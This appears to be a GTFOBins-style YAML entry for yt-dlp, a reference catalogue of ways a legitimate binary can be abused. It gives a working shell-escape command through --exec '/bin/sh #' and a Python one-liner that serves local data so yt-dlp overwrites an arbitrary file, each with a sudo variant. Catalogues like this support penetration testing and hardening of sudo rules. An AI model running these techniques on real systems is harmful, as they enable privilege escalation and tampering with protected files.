---
functions:
  shell:
  - code: |-
      yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
    comment: |-
      The URL must point to a valid YouTube video which will be actually downloaded.
    contexts:
      sudo:
      unprivileged:
  file-write:
  - code: |-
      python3 -c 'import threading,http.server,socketserver,subprocess;p=b"DATA";H=type("H",(http.server.BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.send_header("Content-Type","video/mp4"),s.send_header("Content-Length",str(len(p))),s.end_headers(),s.wfile.write(p)),"log_message":lambda s,*a:None});socketserver.TCPServer.allow_reuse_address=True;s=socketserver.TCPServer(("",8000),H);threading.Thread(target=s.serve_forever,daemon=True).start();subprocess.run(["yt-dlp","--force-generic-extractor","--force-overwrites","-o","/path/to/output-file","http://localhost:8000/fake-video.mp4"]);s.shutdown()'
    comment: |-
      This starts a local HTTP server serving DATA, then uses yt-dlp to write or overwrite a file at an arbitrary path. This does not require internet access.
    contexts:
      sudo:
        code: |-
          python3 -c 'import threading,http.server,socketserver,subprocess;p=b"DATA";H=type("H",(http.server.BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.send_header("Content-Type","video/mp4"),s.send_header("Content-Length",str(len(p))),s.end_headers(),s.wfile.write(p)),"log_message":lambda s,*a:None});socketserver.TCPServer.allow_reuse_address=True;s=socketserver.TCPServer(("",8000),H);threading.Thread(target=s.serve_forever,daemon=True).start();subprocess.run(["sudo","yt-dlp","--force-generic-extractor","--force-overwrites","-o","/path/to/output-file","http://localhost:8000/fake-video.mp4"]);s.shutdown()'
      unprivileged:
...
